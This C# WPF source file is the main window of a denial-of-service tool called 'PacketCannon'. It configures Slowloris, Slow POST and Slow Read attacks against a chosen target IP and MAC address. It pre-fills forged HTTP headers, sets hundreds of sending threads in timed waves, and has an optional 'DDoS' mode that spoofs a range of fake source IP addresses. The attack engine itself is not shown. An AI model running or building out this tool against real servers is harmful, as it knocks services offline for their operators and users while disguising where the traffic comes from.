using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace PacketCannon
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>

    public partial class MainWindow
    {
        public PacketDevice PacketDevice;
        public DosController Setup;
        private Thread _senders;

        public ShutdownMode ShutdownMode { get; }

        public MainWindow()
        {
            this.Dispatcher.UnhandledException += OnDispatcherUnhandledException;

            Setup = new DosController();
            InitializeComponent();

            this.DataContext = Setup;
            ResetAllAdditionalSettingsFields();
            ShutdownMode = ShutdownMode.OnLastWindowClose;
        }

        private void OnDispatcherUnhandledException(object sender, System.Windows.Threading.DispatcherUnhandledExceptionEventArgs e)
        {
            string errorMessage = $"An unhandled exception occurred: {e.Exception.Message}";
            MessageBox.Show(errorMessage, "Error", MessageBoxButton.OK, MessageBoxImage.Error);

            e.Handled = true;
        }

        private void HostIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.SourceIpv4 = HostIpAddress.Text;
            }
        }

        private void TargetIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.DestinationIpV4 = TargetIpAddress.Text;
            }
        }

        private void ChooseIntButtonClick(object sender, RoutedEventArgs e)
        {
            var interfaceWindow = new IntWindow();
            interfaceWindow.Show();
            IsEnabled = false;
        }

        private void GetTargetMacButtonClick(object sender, RoutedEventArgs e)
        {
            string a;
            try
            {
                a = DosController.GetMacFromIp(TargetIpAddress.Text).ToString();
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message, "Packet Cannon", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (a == "00:00:00:00:00:00")
            {
                if (DosController.PingAddress(TargetIpAddress.Text))
                {
                    TargetMacAddress.Text = DosController.GetMacFromIp(DosController.GetDefaultGateway().ToString()).ToString();
                    return;
                }
                MessageBox.Show("INVALID IP ADDRESS GIVEN", "Packet Cannon", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            else TargetMacAddress.Text = a;
        }

        private void Attacks_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            Setup.ChangeAttackMode(Attacks.SelectedIndex.ToString());

            if (SlowLorisHeaderLabel != null) // IN CREATING OF INT, TEXTBOXES ARE NULL
            {
                HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Hidden);

                ResetAllAdditionalSettingsFields();

                switch (Attacks.SelectedIndex.ToString())
                {
                    case "0":
                        SlowLorisHeaderLabel.Visibility = Visibility.Visible;
                        SlowLorisHeaderTextBox.Visibility = Visibility.Visible;
                        SlowLorisKeepAliveDataLabel.Visibility = Visibility.Visible;
                        SlowLorisKeepAliveDataTextBox.Visibility = Visibility.Visible;
                        break;

                    case "1":
                        SlowPostHeaderLabel.Visibility = Visibility.Visible;
                        SlowPostHeaderTextBox.Visibility = Visibility.Visible;
                        SlowPostContentLengthTextBox.Visibility = Visibility.Visible;
                        SlowPostContentLengthLabel.Visibility = Visibility.Visible;
                        break;

                    case "2":
                        SlowReadUrlLabel.Visibility = Visibility.Visible;
                        SlowReadUrlTextBox.Visibility = Visibility.Visible;
                        SlowReadWinSizeLabel.Visibility = Visibility.Visible;
                        SlowReadWindowSizeTextBox.Visibility = Visibility.Visible;
                        break;
                }
            }
        }

        private void ResetAllAdditionalSettingsFields()
        {
            SlowLorisHeaderTextBox.Text = $"GET /?654865241562456 HTTP/1.1\r\nHost: {HostAddress.Text} \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n";

            SlowLorisKeepAliveDataTextBox.Text = "X-a: b";

            SlowReadUrlTextBox.Text = @"/index.html";

            SlowReadWindowSizeTextBox.Text = "10";

            SlowPostContentLengthTextBox.Text = "1000000";

            SlowPostHeaderTextBox.Text = $"POST /textform.php HTTP/1.1\r\nHost: {HostAddress.Text}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)";

            StartPortTextBox.Text = "5000";

            PortStepTextBox.Text = "1";

            SenderCountTextBox.Text = "500";

            SendersWaveTimeTextBox.Text = "2000";

            SendersTimeBetweenTextBox.Text = "10";
        }

        private void HideAllAdditionalSettingsTextAndCheckBoxes(Visibility visibility)
        {
            SlowReadWindowSizeTextBox.Visibility = visibility;
            SlowLorisHeaderTextBox.Visibility = visibility;
            SlowPostHeaderTextBox.Visibility = visibility;
            SlowLorisKeepAliveDataTextBox.Visibility = visibility;
            SlowReadUrlTextBox.Visibility = visibility;
            SlowPostContentLengthTextBox.Visibility = visibility;

            SlowLorisKeepAliveDataLabel.Visibility = visibility;
            SlowLorisHeaderLabel.Visibility = visibility;
            SlowPostHeaderLabel.Visibility = visibility;
            SlowLorisKeepAliveDataLabel.Visibility = visibility;
            SlowReadUrlLabel.Visibility = visibility;
            SlowReadWinSizeLabel.Visibility = visibility;
            SlowPostContentLengthLabel.Visibility = visibility;
        }

        private void OnlyNumbers(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            e.Handled = Regex.IsMatch(e.Text, @"[^0-9]");
        }

        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Setup.Terminate = false;
                StartButton.IsEnabled = false;
                StopButton.IsEnabled = true;

                Attacks.IsEnabled = false;
                GetMackAddressButton.IsEnabled = false;
                SelectInterfaceButton.IsEnabled = false;
                if (CheckAllRequiredFields())
                {
                    _senders = new Thread(Setup.StartSenders);
                    _senders.Start();
                    LoadingWheel.Visibility = Visibility.Visible;
                }
                else
                {
                    Attacks.IsEnabled = true;
                    GetMackAddressButton.IsEnabled = true;
                    SelectInterfaceButton.IsEnabled = true;
                }
            }
            catch (Exception x)
            {
                MessageBox.Show(x.Message + "\n" + x.StackTrace, "Packet Cannon", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            Setup.Terminate = true;
            StopButton.IsEnabled = false;
            StartButton.IsEnabled = true;
            Attacks.IsEnabled = true;

            GetMackAddressButton.IsEnabled = true;
            SelectInterfaceButton.IsEnabled = true;
            _senders.Abort();
            LoadingWheel.Visibility = Visibility.Hidden;
        }

        private bool CheckAllRequiredFields()
        {
            try
            {
                if (TargetIpAddress.Text.Equals("") || HostIpAddress.Text.Equals("") || TargetMacAddress.Text.Equals("") ||
                    HostAddress.Text.Equals("")) throw new ArgumentException();

                Setup.DestinationIpV4 = TargetIpAddress.Text;
                Setup.SourceIpv4 = HostIpAddress.Text;
                Setup.DestinationMac = new MacAddress(TargetMacAddress.Text);
                Setup.SourceMac = new MacAddress(HostMacAddress.Text);
                Setup.HostAddress = HostAddress.Text;
                CheckAndAssertAdditionalSettings();
                CheckDDosSettings();
                return true;
            }
            catch (ArgumentOutOfRangeException e)
            {
                MessageBox.Show(e.Message, "Packet Cannon", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            catch (Exception e)
            {
                MessageBox.Show("Some field are with wrong parameters\n" + e.Message, "Packet Cannon", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            Setup.Terminate = true;
            StopButton.IsEnabled = false;
            StartButton.IsEnabled = true;
            return false;
        }

        private void CheckDDosSettings()
        {
            if (DDosCheckBox.IsChecked != null && (bool)DDosCheckBox.IsChecked)
            {
                Setup.Ddos = true;
                if (FakeAddressesCount.Text != "")
                {
                    Setup.DdosCount = Convert.ToInt32(FakeAddressesCount.Text);
                }

                if (Convert.ToInt32(FakeAddressesMinValue.Text) < 1 ||
                    Convert.ToInt32(FakeAddressesMaxValue.Text) < Convert.ToInt32(FakeAddressesMinValue.Text) ||
                    Convert.ToInt32(FakeAddressesMaxValue.Text) > 254 ||
                    Convert.ToInt32(FakeAddressesMaxValue.Text) - Convert.ToInt32(FakeAddressesMinValue.Text) < Convert.ToInt32(FakeAddressesCount.Text))
                {
                    throw new ArgumentOutOfRangeException("", @"Bad range of IP addresses");
                }

                Setup.FakeIpAddressMin = Convert.ToInt32(FakeAddressesMinValue.Text);
                Setup.FakeIpAddressMax = Convert.ToInt32(FakeAddressesMaxValue.Text);
            }
            else Setup.Ddos = false;
        }

        private void CheckAndAssertAdditionalSettings()
        {
            switch (Attacks.SelectedIndex.ToString())
            {
                case "0":
                    if (SlowLorisKeepAliveDataTextBox.Text.Equals("") || SlowLorisHeaderTextBox.Text.Equals(""))
                        throw new ArgumentException("SlowLoris attack parameters should not be empty");
                    else
                    {
                        Setup.SlowLorisKeepAliveData = SlowLorisKeepAliveDataTextBox.Text;
                        Setup.SlowLorisHeader = SlowLorisHeaderTextBox.Text;
                    }
                    break;

                case "1":
                    if (SlowPostContentLengthTextBox.Text.Equals("") || SlowPostHeaderTextBox.Text.Equals(""))
                        throw new ArgumentException("Slow Post attack parameters should not be empty");
                    else
                    {
                        Setup.SlowPostHeader = SlowPostHeaderTextBox.Text;
                        Setup.SlowPostContentLength = Convert.ToInt32(SlowPostContentLengthTextBox.Text);
                    }
                    break;

                case "2":
                    if (SlowReadWindowSizeTextBox.Text.Equals("") || SlowReadUrlTextBox.Text.Equals(""))
                        throw new ArgumentException("Slow Read attack parameters should not be empty");
                    else
                    {
                        Setup.SlowReadWindowSize = Convert.ToInt32(SlowReadWindowSizeTextBox.Text);
                        Setup.SlowReadUrl = SlowReadUrlTextBox.Text;
                    }
                    break;
            }
            if (SenderCountTextBox.Text.Equals("") || SendersTimeBetweenTextBox.Text.Equals("") ||
                SendersWaveTimeTextBox.Text.Equals("") || StartPortTextBox.Text.Equals("") ||
                PortStepTextBox.Text.Equals("") || Convert.ToInt32(StartPortTextBox.Text) < 1000)
            {
                throw new ArgumentException("Additional settings about senders should not be invalid or empty empty");
            }
            else
            {
                Setup.SenderSize = Convert.ToInt32(SenderCountTextBox.Text);
                Setup.SenderTimeOut = Convert.ToInt32(SendersTimeBetweenTextBox.Text);
                Setup.SenderWaveTimeOut = Convert.ToInt32(SendersWaveTimeTextBox.Text);
                Setup.SourcePort = Convert.ToInt32(StartPortTextBox.Text);
                Setup.PortStep = Convert.ToInt32(PortStepTextBox.Text);
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
        }

        private void EnableDDosClicked(object sender, RoutedEventArgs e)
        {
            if (DDosCheckBox.IsChecked != null && (bool)DDosCheckBox.IsChecked)
            {
                FakeAddressesCount.IsEnabled = true;
                FakeAddressesMaxValue.IsEnabled = true;
                FakeAddressesMinValue.IsEnabled = true;
            }
            else
            {
                FakeAddressesCount.IsEnabled = false;
                FakeAddressesMaxValue.IsEnabled = false;
                FakeAddressesMinValue.IsEnabled = false;
            }
            FakeAddressesCount.IsEnabled = DDosCheckBox.IsChecked == true;
        }

        private void TextBox_OnGotFocus(object sender, RoutedEventArgs e)
        {
            //HostAddress.TextWrapping = TextWrapping.Wrap;
            var a = (TextBox)e.OriginalSource;
            if (a != null) a.TextWrapping = TextWrapping.Wrap;
        }

        private void TextBox_OnLostFocus(object sender, RoutedEventArgs e)
        {
            //HostAddress.TextWrapping = TextWrapping.NoWrap;
            var a = (TextBox)e.OriginalSource;
            if (a != null) a.TextWrapping = TextWrapping.NoWrap;
        }
    }
}